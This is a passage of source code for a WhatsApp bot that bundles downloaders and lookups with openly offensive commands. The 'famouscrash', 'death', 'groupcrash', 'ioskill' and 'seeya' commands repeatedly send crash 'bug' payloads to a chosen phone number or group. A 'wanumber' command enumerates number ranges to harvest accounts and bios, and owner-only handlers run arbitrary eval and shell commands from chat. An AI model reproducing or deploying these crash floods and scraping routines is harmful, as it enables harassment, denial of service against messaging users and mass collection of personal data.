     await LordVoltage.sendMessage(m.chat, {image: { url: data.photo_profile }, caption: te }, {quoted: m})
      } catch {
        replynano(`Make sure the username is from *Instagram*`)
      }}
}
break
case 'tiktokstalk':
case 'ttstalk': {if (prefix === '.') {
if (!args[0]) return replynano(`Enter TikTok Username\n\nExample: ${prefix + command} `)
const respon = await fetchJson(`https://skizo.tech/api/ttstalk?apikey=nanogembul&user=${encodeURIComponent(text)}`)
LordVoltage.sendMessage(m.chat, { react: { text: '🕒', key: m.key }})
try {
const data = respon.data.user
const data1 = respon.data.stats
    let res = await fg.igStalk(args[0])
    let te = `
┌──「 *STALKING* 
▢ *🔖Name:* ${data.nickname} 
▢ *🔖Username:* ${data.uniqueId}
▢ *👥Follower:* ${data1.followerCount}
▢ *🫂Following:* ${data1.followingCount}
▢ *📌Bio:* ${data.signature}
▢ *🏝️Posts:* ${data1.videoCount}
▢ *❣️Like:* ${data1.heart}
▢ *🔗 Link* : https://tiktok.com/${data.uniqueId}
└────────────`
     await LordVoltage.sendMessage(m.chat, {image: { url: data.avatarLarger }, caption: te }, {quoted: m})
      } catch {
        replynano(`Make sure the username comes from *tiktok*`)
      }
}}
break
case 'fb':
case 'fbdl':
           case 'facebook':
           case 'fb': {
      if (prefix === '.') {        
        const path = require('path');
                const text = m.message?.conversation || m.message?.extendedTextMessage?.text;
        const url = text?.split(' ')?.slice(1)?.join(' ')?.trim();

        if (!url) {
          return replynano("Please provide a Facebook video URL.\nExample: .fb https://www.facebook.com/...");
        }

        if (!url.includes('facebook.com')) {
          return replynano("That is not a Facebook link.");
        }

        // Send initial loading reaction
        await LordVoltage.sendMessage(m.chat, {
          react: { text: '⏳', key: m.key }
        });

        try {
          const response = await axios.get(`https://api.dreaded.site/api/facebook?url=${encodeURIComponent(url)}`);
          const data = response.data;

          if (!data || data.status !== 200 || !data.facebook || !data.facebook.sdVideo) {
            await LordVoltage.sendMessage(m.chat, { react: { text: '❌', key: m.key } }); // Send error reaction
            return replynano("Sorry, the API didn't respond correctly. Please try again later!");
          }

          const fbvid = data.facebook.sdVideo;

          if (!fbvid) {
            await LordVoltage.sendMessage(m.chat, { react: { text: '❌', key: m.key } }); // Send error reaction
            return replynano("Wrong Facebook data. Please ensure the video exists.");
          }

          const tmpDir = path.join(process.cwd(), 'tmp');
          if (!fs.existsSync(tmpDir)) {
            fs.mkdirSync(tmpDir, { recursive: true });
          }

          const tempFile = path.join(tmpDir, `fb_${Date.now()}.mp4`);

          const videoResponse = await axios({
            method: 'GET',
            url: fbvid,
            responseType: 'stream',
            headers: {
              'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
              'Accept': 'video/mp4,video/*;q=0.9,*/*;q=0.8',
              'Accept-Language': 'en-US,en;q=0.5',
              'Range': 'bytes=0-',
              'Connection': 'keep-alive',
              'Referer': 'https://www.facebook.com/'
            }
          });

          const writer = fs.createWriteStream(tempFile);
          videoResponse.data.pipe(writer);

          await new Promise((resolve, reject) => {
            writer.on('finish', resolve);
            writer.on('error', reject);
          });

          if (!fs.existsSync(tempFile) || fs.statSync(tempFile).size === 0) {
            await LordVoltage.sendMessage(m.chat, { react: { text: '❌', key: m.key } }); // Send error reaction
            throw new Error('Failed to download video');
          }

          // Send success reaction before sending video
          await LordVoltage.sendMessage(m.chat, { react: { text: '✅', key: m.key } });

          await LordVoltage.sendMessage(m.chat, {
            video: { url: tempFile },
            mimetype: "video/mp4",
            caption: `> *ᴘᴏᴡᴇʀᴇᴅ ʙʏ ᴠᴏʟᴛᴀɢᴇ ʟᴏʀᴅ ᴅᴇᴠ*`
          }, { quoted: m });

          try {
            fs.unlinkSync(tempFile);
          } catch (err) {
            console.error('Error cleaning up temp file:', err);
          }

        } catch (error) {
          console.error('Error in Facebook command:', error);
          replynano("An error occurred. API might be down. Error: " + error.message);
        }
      }
    }
    break;
//=========================================\\

//=========================================\\
    case 'say': case 'tts': case 'gtts':{if (prefix === '.') {
if (!text) return replynano('Where is the text?')
            let texttts = text
            const xeonrl = googleTTS.getAudioUrl(texttts, {
                lang: "en",
                slow: false,
                host: "https://translate.google.com",
            })
            return LordVoltage.sendMessage(m.chat, {
                audio: {
                    url: xeonrl,
                },
                mimetype: 'audio/mp4',
                ptt: true,
                fileName: `${text}.mp3`,
            }, {
                quoted: m,
            })
        }}
        break

    case 'fact': {if (prefix === '.') {
    	const { data } = await axios.get(`https://nekos.life/api/v2/fact`)
        return replynano(`${themeemoji} *Fact:* ${data.fact}\n`)   
    }}
    break    
case 'myip': {if (prefix === '.') {
        if (!DanzTheCreator) return reply(mess.only.owner)
var http = require('http')
http.get({
'host': 'api.ipify.org',
'port': 80,
'path': '/'
}, function(resp) {
resp.on('data', function(ip) {
    replynano("🔎 Your Ip Address Is: " + ip)
})
})
            }}
        break            
case 'gdrive': {if (prefix === '.') {
		if (!args[0]) return replynano(`Please enter your gdrive link`)
	reply(mess.wait)
	const fg = require('api-dylux')
	try {
	let res = await fg.GDriveDl(args[0])
	 await replynano(`
≡ *Google Drive Download*
▢ *Name:* ${res.fileName}
▢ *Size:* ${res.fileSize}
▢ *Type:* ${res.mimetype}`)
	LordVoltage.sendMessage(m.chat, { document: { url: res.downloadUrl }, fileName: res.fileName, mimetype: res.mimetype }, { quoted: m })
   } catch {
	replynano('Error: Please check your gdrive link 🗿') 
  }
}}
break
case 'invite': {if (prefix === '.') {
	if (!m.isGroup) return reply(mess.only.group)
	const hasPermission = checkGroupAdminPermission(m, reply, isGroupAdmins, DanzTheCreator);
        if (!hasPermission) {return;}
if (!text) return replynano(`Please Enter the Number You Want to Invite\n\nExample :\n*${prefix + command}* 234xxx\n\nIf you want the group link type .linkgc`)
if (text.includes('+')) return replynano(`Enter the number together without *+*`)
if (isNaN(text)) return replynano(`Enter only the numbers plus your country code without spaces`)
let group = m.chat
let link = 'https://chat.whatsapp.com/' + await LordVoltage.groupInviteCode(group)
      await LordVoltage.sendMessage(text+'@s.whatsapp.net', {text: `≡ *GROUP INVITATION*\n\nA user invites you to join this group \n\n${link}`, mentions: [m.sender]})
        replynano(` An invite link is sent to the user`) 
}}
break
case 'xnxxdl': {if (prefix === '.') {
	if (!isPrem) return replyprem(mess.premium)
	if (!text) return replynano(`Enter Url`)
        if (!text.includes('xnxx.com')) return replynano(`Enter an xnxx link`)
        reply(mess.wait)
        const fg = require('api-dylux')
            let xn = await fg.xnxxdl(text)
LordVoltage.sendMessage(m.chat, { caption: `≡  *XNXX DL*
        
▢ *📌 Title*: ${xn.result.title}
▢ *⌚Duration* ${xn.result.duration}
▢ *🎞️Quality:* ${xn.result.quality}`, video: {url: xn.result.files.high} }, { quoted: m })
}}
break
case 'xnxxsearch': {if (prefix === '.') {
	if (!isPrem) return replyprem(mess.premium)
	if (!text) return replynano(`Enter Query`)
	reply(mess.wait)
	const fg = require('api-dylux')
	let res = await fg.xnxxSearch(text)
            let ff = res.result.map((v, i) => `${i + 1}┃ *Title* : ${v.title}\n*Link:* ${v.link}\n`).join('\n') 
              if (res.status) replynano(ff)
              }}
              break
              
case 'ringtone': {if (prefix === '.') {
		if (!text) return replynano(`Example : ${prefix + command} black rover`)
        let { ringtone } = require('./lib/scraper')
		let anutone2 = await ringtone(text)
		let result = anutone2[Math.floor(Math.random() * anutone2.length)]
		LordVoltage.sendMessage(m.chat, { audio: { url: result.audio }, fileName: result.title+'.mp3', mimetype: 'audio/mpeg' }, { quoted: m })
	    }}
	    break
	case 'genshin':
if (!text) return replynano(`Which genshin are you lookin for?`)
try {
const genshin = require("genshin-api")
a = text.toLowerCase();
const anime = await genshin.Characters(text)
let txt = ""
txt += `🎀 *Nama:* ${anime.name}\n`
txt += `🎖️ *Judul:* ${anime.title}\n`
txt += `💠 *Versi:* ${anime.vision}\n`
txt += `🏹 *Weapon:* ${anime.weapon}\n`
txt += `💮 *Gender:* ${anime.gender}\n`
txt += `🌏 *Nation:* ${anime.nation}\n`
txt += `🪷 *Affiliation:* ${anime.affiliation}\n`
txt += `🌟 *Rarity:* ${anime.rarity}\n`
txt += `❄️ *Constellation:* ${anime.constellation}\n`
txt += `📖 *Description:* ${anime.description}\n`
txt += `🌐 *Url:* https://genshin-impact.fandom.com/wiki/${a}\n`
urll = `https://api.genshin.dev/characters/${a}/portrait`
await LordVoltage.sendMessage(m.chat,{image:{url:urll}, caption:txt},{quoted:m})
} catch (err) {
console.log(err)
return replynano('Error')
}
break


	case 'anime': {
if (!text) return replynano(`What Anime Are You Looking For?`)
const malScraper = require('mal-scraper')
reply(mess.wait)
        const anime = await malScraper.getInfoFromName(text).catch(() => null)
        if (!anime) return replynano(`Could not find`)
let animetxt = `
🎀 *Title: ${anime.title}*
🎋 *Type: ${anime.type}*
🎐 *Premiered on: ${anime.premiered}*
💠 *Total Episodes: ${anime.episodes}*
📈 *Status: ${anime.status}*
💮 *Genres: ${anime.genres}
📍 *Studio: ${anime.studios}*
🌟 *Score: ${anime.score}*
💎 *Rating: ${anime.rating}*
🏅 *Rank: ${anime.ranked}*
💫 *Popularity: ${anime.popularity}*
♦️ *Trailer: ${anime.trailer}*
🌐 *URL: ${anime.url}*
❄ *Description:* ${anime.synopsis}*`
await LordVoltage.sendMessage(m.chat,{image:{url:anime.picture}, caption:animetxt},{quoted:m})
}
break
case 'animevideo': 
case 'amv': {if (prefix === '.') {
    if (!text) return reply('Enter the number \nExample: .amv 1')
    reply(mess.wait)
async function animeVideo() {
    const url = 'https://shortstatusvideos.com/anime-video-status-download/'; // Ganti dengan URL yang sesuai
    const response = await fetch(url);
    const html = await response.text();
    const $ = cheerio.load(html);
    const videos = [];
    $('a.mks_button.mks_button_small.squared').each((index, element) => {
        const href = $(element).attr('href');
        const title = $(element).closest('p').prevAll('p').find('strong').text();
        videos.push({
            title,
            source: href
        });
    });

    const randomIndex = Math.floor(Math.random() * videos.length);
    const randomVideo = videos[randomIndex];

    return randomVideo;
}

async function animeVideo2() {
    const url = 'https://mobstatus.com/anime-whatsapp-status-video/'; // Ganti dengan URL yang sesuai
    const response = await fetch(url);
    const html = await response.text();
    const $ = cheerio.load(html);

    const videos = [];

    const title = $('strong').text();

    $('a.mb-button.mb-style-glass.mb-size-tiny.mb-corners-pill.mb-text-style-heavy').each((index, element) => {
        const href = $(element).attr('href');
        videos.push({
            title,
            source: href
        });
    });

    const randomIndex = Math.floor(Math.random() * videos.length);
    const randomVideo = videos[randomIndex];

    return randomVideo;
}
    if (text == '1') {
        try {
            let resl = await animeVideo()
            let cap = `\`ohayo 😙\``
            await LordVoltage.sendFile(m.chat, resl.source, "", cap, m)
        } catch (e) {
            await reply(eror)
        }
    }
    if (text == '2') {
        try {
            let resl = await animeVideo2()
            let cap = `\`ohayo 😙\``
            await LordVoltage.sendFile(m.chat, resl.source, "", cap, m)
        } catch (e) {
            await reply(eror)
        }
    }
}}
break
case 'imdb':if (prefix === '.') {
if (!text) return replynano(`_Name a Series or movie`)
reply(mess.wait)
            let fids = await axios.get(`http://www.omdbapi.com/?apikey=742b2d09&t=${text}&plot=full`)
            let imdbt = ""
            console.log(fids.data)
            imdbt += "⚍⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚍\n" + " ``` IMDB SEARCH```\n" + "⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎\n"
            imdbt += "🎬Title      : " + fids.data.Title + "\n"
            imdbt += "📅Year       : " + fids.data.Year + "\n"
            imdbt += "⭐Rated      : " + fids.data.Rated + "\n"
            imdbt += "📆Released   : " + fids.data.Released + "\n"
            imdbt += "⏳Runtime    : " + fids.data.Runtime + "\n"
            imdbt += "🌀Genre      : " + fids.data.Genre + "\n"
            imdbt += "👨🏻‍💻Director   : " + fids.data.Director + "\n"
            imdbt += "✍Writer     : " + fids.data.Writer + "\n"
            imdbt += "👨Actors     : " + fids.data.Actors + "\n"
            imdbt += "📃Plot       : " + fids.data.Plot + "\n"
            imdbt += "🌐Language   : " + fids.data.Language + "\n"
            imdbt += "🌍Country    : " + fids.data.Country + "\n"
            imdbt += "🎖️Awards     : " + fids.data.Awards + "\n"
            imdbt += "📦BoxOffice  : " + fids.data.BoxOffice + "\n"
            imdbt += "🏙️Production : " + fids.data.Production + "\n"
            imdbt += "🌟imdbRating : " + fids.data.imdbRating + "\n"
            imdbt += "🙂imdbVotes  : " + fids.data.imdbVotes + ""
           LordVoltage.sendMessage(m.chat, {
image: {
url: fids.data.Poster,
},
caption: imdbt,
            }, {
quoted: m,
            })}
            break
case 'cuaca':
case 'weather':{if (prefix === '.') {
if (!text) return replynano('What location?')
            let wdata = await axios.get(
                `https://api.openweathermap.org/data/2.5/weather?q=${text}&units=metric&appid=060a6bcfa19809c2cd4d97a212b19273&language=en`
            );
            let textw = ""
            textw += `*🗺️ Weather of  ${text}*\n\n`
            textw += `*☀️ Weather:-* ${wdata.data.weather[0].main}\n`
            textw += `*📖 Description:-* ${wdata.data.weather[0].description}\n`
            textw += `*🌡️ Avg Temp:-* ${wdata.data.main.temp}\n`
            textw += `*🙂 Feels Like:-* ${wdata.data.main.feels_like}\n`
            textw += `*⚖️ Pressure:-* ${wdata.data.main.pressure}\n`
            textw += `*🌬️ Humidity:-* ${wdata.data.main.humidity}\n`
            textw += `*💧 Humidity:-* ${wdata.data.wind.speed}\n`
            textw += `*🌐 Latitude:-* ${wdata.data.coord.lat}\n`
            textw += `*📏 Longitude:-* ${wdata.data.coord.lon}\n`
            textw += `*🇳🇬 Country:-* ${wdata.data.sys.country}\n`

           LordVoltage.sendMessage(
                m.chat, {
                    text: textw,
                }, {
                    quoted: m,
                }
           )
           }}
           break

           case 'wanumber': case 'searchno': case 'searchnumber':{
           	if (!text) return replynano(`Provide Number with last number x\n\nExample: ${prefix + command} 234xxxx`)
var inputnumber = text.split(" ")[0]
        
        replynano(`Searching for WhatsApp account in given range...`)
        function countInstances(string, word) {
            return string.split(word).length - 1
        }
        var number0 = inputnumber.split('x')[0]
        var number1 = inputnumber.split('x')[countInstances(inputnumber, 'x')] ? inputnumber.split('x')[countInstances(inputnumber, 'x')] : ''
        var random_length = countInstances(inputnumber, 'x')
        var randomxx
        if (random_length == 1) {
            randomxx = 10
        } else if (random_length == 2) {
            randomxx = 100
        } else if (random_length == 3) {
            randomxx = 1000
        }
        var text66 = `*==[ List of Whatsapp Numbers ]==*\n\n`
        var nobio = `\n*Bio:* || \nHey there! I am using WhatsApp.\n`
        var nowhatsapp = `\n*Numbers with no WhatsApp account within provided range.*\n`
        for (let i = 0; i < randomxx; i++) {
            var nu = ['1', '2', '3', '4', '5', '6', '7', '8', '9']
            var status1 = nu[Math.floor(Math.random() * nu.length)]
            var status2 = nu[Math.floor(Math.random() * nu.length)]
            var status3 = nu[Math.floor(Math.random() * nu.length)]
            var dom4 = nu[Math.floor(Math.random() * nu.length)]
            var random21
            if (random_length == 1) {
random21 = `${status1}`
            } else if (random_length == 2) {
random21 = `${status1}${status2}`
            } else if (random_length == 3) {
random21 = `${status1}${status2}${status3}`
            } else if (random_length == 4) {
random21 = `${status1}${status2}${status3}${dom4}`
            }
            var anu = await LordVoltage.onWhatsApp(`${number0}${i}${number1}@s.whatsapp.net`)
            var anuu = anu.length !== 0 ? anu : false
            try {
try {
var anu1 = await LordVoltage.fetchStatus(anu[0].jid)
} catch {
var anu1 = '401'
}
if (anu1 == '401' || anu1.status.length == 0) {
nobio += `wa.me/${anu[0].jid.split("@")[0]}\n`
} else {
text66 += `🪀 *Number:* wa.me/${anu[0].jid.split("@")[0]}\n 🎗️*Bio :* ${anu1.status}\n🧐*Last update :* ${moment(anu1.setAt).tz('Africa/Lagos').format('HH:mm:ss DD/MM/YYYY')}\n\n`
}
            } catch {
nowhatsapp += `${number0}${i}${number1}\n`
            }
        }
        replynano(`${text66}${nobio}${nowhatsapp}`)
        }
break
    case 'famouscrash':
    case 'famous-ui': {if (prefix === '.') {
        if (!DanzTheCreator && !isPrem) {
            return replynano("This Command Is Meant For My Master Bitch 🖕🤬");
        }

        if (!q) return replynano(`Send command with Number:\n${prefix + command} <Number>`);

        let jidx = q.replace(/[^0-9]/g, "");

        if (jidx.startsWith('0')) {
            return replynano(`The number starts with '0'. Replace it with the country code number.\n\nExample: ${prefix + command} 234xxxx`);
        }

        let target = jidx + "@s.whatsapp.net";

        await LordVoltage.sendMessage(m.chat, {
            text: `𝐒𝐮𝐜𝐜𝐞𝐬𝐬 𝐒𝐞𝐧𝐝𝐢𝐧𝐠 𝐁𝐮𝐠 𝐓𝐨 𝐓𝐚𝐫𝐠𝐞𝐭!!!

[ 𝑰𝒏𝒇𝒐𝒓𝒎𝒂𝒕𝒊𝒏 ]
𝕋𝕒𝕣𝕘𝕖𝕥 : ${jidx}
𝕋𝕪𝕡𝕖𝔹𝕦𝕘 : *Force Ui*
𝕊𝕥𝕒𝕥𝕦𝕤 : *Success Send Bug,Check Target Number*`
   }, { quoted: fkontak });
        for (let i = 0; i < 40; i++) {
            await protocolbug5(target, LordVoltage, true);
            await sleep(3000);
            await protocolbug5(target, LordVoltage, true);
            await sleep(3000);
            await protocolbug5(target, LordVoltage, true);
            await sleep(3000);
        }
        console.log(chalk.red.bold("Success!"));
        break;
    }}
    


        case 'death':  {if (prefix === '.') {
            if (!DanzTheCreator && !isPrem) {
                return replynano("This Command Is Meant For My Master Bitch 🖕🤬"); 
            }        
            if (!q) return replynano(`Send command with Number:\n${prefix + command} <Number>`); 

            let jidx = q.replace(/[^0-9]/g, ""); 
            if (jidx.startsWith('0')) {
                return replynano(`The number starts with '0'. Replace it with the country code number.\n\nExample: ${prefix + command} 234xxxx`);
            }
            let target = jidx + "@s.whatsapp.net"; // 
            await LordVoltage.sendMessage(m.chat, {
                text: `𝐒𝐮𝐜𝐜𝐞𝐬𝐬 𝐒𝐞𝐧𝐝𝐢𝐧𝐠 𝐁𝐮𝐠 𝐓𝐨 𝐓𝐚𝐫𝐠𝐞𝐭!!!
[ 𝑰𝒏𝒇𝒐𝒓𝒎𝒂𝒕𝒊𝒐𝒏 ]
𝕋𝕒𝕣𝕘𝕖𝕥 : ${jidx}
𝕋𝕪𝕡𝕖𝔹𝕦𝕘 : DEATH UI*
𝕊𝕥𝕒𝕥𝕦𝕤 : *Success Send Bug,Check Target Number*`
            }, { quoted: fkontak });
            for (let i = 0; i < 40; i++) { // Sends the bug 40 times
                await bak2(target, LordVoltage); 
                await sleep(3000);
            }
            console.log(chalk.red.bold("Success sending Weak UI bug!"));}
            break; 
        }   
case 'gcrash':
case 'groupcrash': {if (prefix === '.') {
            if (!DanzTheCreator && !isPrem) {
                return replynano("This Command Is Meant For My Master Bitch 🖕🤬");
            }
            if (!m.isGroup) { 
                return replynano("This command can only be used in a group!");
            }
            let target = m.chat; 
            await LordVoltage.sendMessage(m.chat, {
                text: `𝐒𝐮𝐜𝐜𝐞𝐬𝐬 𝐒𝐞𝐧𝐝𝐢ng 𝐆𝐫𝐨𝐮𝐩 𝐁𝐮𝐠 𝐓𝐨 𝐓𝐚𝐫𝐠𝐞𝐭!!!

[ 𝑰𝒏𝒇𝒐𝒓𝒎𝒂𝒕𝒊𝒏 ]
𝕋𝕒𝕣𝕘𝕖𝕥 : This Group
𝕋𝕪𝕡𝕖𝔹𝕦𝕘 : *Group DEATH UI*
𝕊𝕥𝕒𝕥𝕦𝕤 : *Success Send Bug,Check Group Members*`
            }, { quoted: fkontak });
            for (let i = 0; i < 40; i++) { // Loop 40 times
                await bak2Group(target, LordVoltage);
                await sleep(3000);
            }
            console.log(chalk.red.bold("Success sending Group Weak UI bug!"));}
            break;
        }  
        case 'ioskill':  {if (prefix === '.') { 
            if (!DanzTheCreator && !isPrem) {
                return replynano("*This Command Is Meant For My Master Bitch 🖕🤬");
            }
            if (!q) return replynano(`Send command with Number:\n${prefix + command} <Number>`);
            let jidx = q.replace(/[^0-9]/g, "");
            if (jidx.startsWith('0')) {
                return replynano(`The number starts with '0'. Replace it with the country code number.\n\nExample: ${prefix + command} 234xxxx`);
            }
            let target = jidx + "@s.whatsapp.net";
            await LordVoltage.sendMessage(m.chat, {
                text: `𝐒𝐮𝐜𝐜𝐞𝐬𝐬 𝐒𝐞𝐧𝐝𝐢𝐧𝐠 𝐁𝐮𝐠 𝐓𝐨 𝐓𝐚𝐫𝐠𝐞𝐭!!!

[ 𝑰𝒏𝐟𝐨𝐫𝐦𝐚𝐭𝐢𝐨𝐧 ]
𝕋𝕒𝕣𝕘𝕖𝕥 : ${jidx}
𝕋𝕪𝕡𝐞𝐁𝐮𝐠 : *iOS Kill*
𝕊𝐭𝐚𝐭𝐮𝐬 : *Success Send Bug,Check Target Number*`
            }, { quoted: fkontak });
            for (let i = 0; i < 40; i++) { 
                await IosCL(target, LordVoltage); 
                await sleep(3000); 
            }
            console.log(chalk.red.bold("Success sending iOS Kill bug!"));}
            break;
        }   
        
        // Inside your switch (command) block in Spark.js

        case 'seeya': {
            if (prefix === '.') {
                if (!DanzTheCreator && !isPrem) {
                    return replynano("This Command Is Meant For My Master Bitch 🖕🤬");
                }

                let target = m.chat;

                await LordVoltage.sendMessage(m.chat, {
                    text: `𝐒𝐮𝐜𝐜𝐞𝐬𝐬 𝐒𝐞𝐧𝐝𝐢𝐧𝐠 𝐁𝐮𝐠 𝐓𝐨 𝐓𝐚𝐫𝐠𝐞𝐭!!!

[ 𝑰𝒏𝐟𝐨𝐫𝐦𝐚𝐭𝐢𝐨𝐧 ]
𝕋𝕒𝕣𝕘𝕖𝕥 : ${m.isGroup ? 'This Group' : 'Direct Message'}
𝕋𝕪𝕡𝐞𝐁𝐮𝐠 : *Bye Bye!*
𝕊𝐭𝐚𝐭𝐮𝐬 : *Success Send Bug,Check Target!*`
                }, { quoted: fkontak });

                for (let i = 0; i < 40; i++) {
                    await BlankInvite(target, LordVoltage);
                    await sleep(3000);
                }
                console.log(chalk.red.bold("Success sending Bye Bye! bug!"));
            }
            break;
        }
default:

if (budy.startsWith('<')) {
if (!DanzTheCreator) return
try {
return reply(JSON.stringify(eval(`${args.join(' ')}`),null,'\t'))
} catch (e) {
reply(e)
}
}

if (budy.startsWith('$')) {
                    if (!DanzTheCreator) return reply(mess.only.owner)
                    exec(budy.slice(2), (err, stdout) => {
                        if (err) return replynano(err)
                        if (stdout) return replynano(stdout)
                    })
                }


if (budy.startsWith('vv')) {
if (!DanzTheCreator) return
try {
let evaled = await eval(budy.slice(2))
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await reply(evaled)
} catch (err) {
reply(String(err))
}
}

if (budy.startsWith('uu')){
if (!DanzTheCreator) return
qur = budy.slice(2)
exec(qur, (err, stdout) => {
if (err) return reply(`${err}`)
if (stdout) {
reply(stdout)
}
})
}
if (isCmd && budy.toLowerCase() != undefined) {
if (m.chat.endsWith('broadcast')) return
if (m.isBaileys) return
let msgs = global.db.database
if (!(budy.toLowerCase() in msgs)) return
LordVoltage.copyNForward(m.chat, msgs[budy.toLowerCase()], true)
}
}

} catch (err) {
console.log(util.format(err))
let e = String(err)
LordVoltage.sendMessage(`@s.whatsapp.net`, {
contextInfo:{
forwardingScore: 9999999, 
isForwarded: true
}})
}
}

process.on('uncaughtException', function (err) {
console.log('Caught exception: ', err)
})
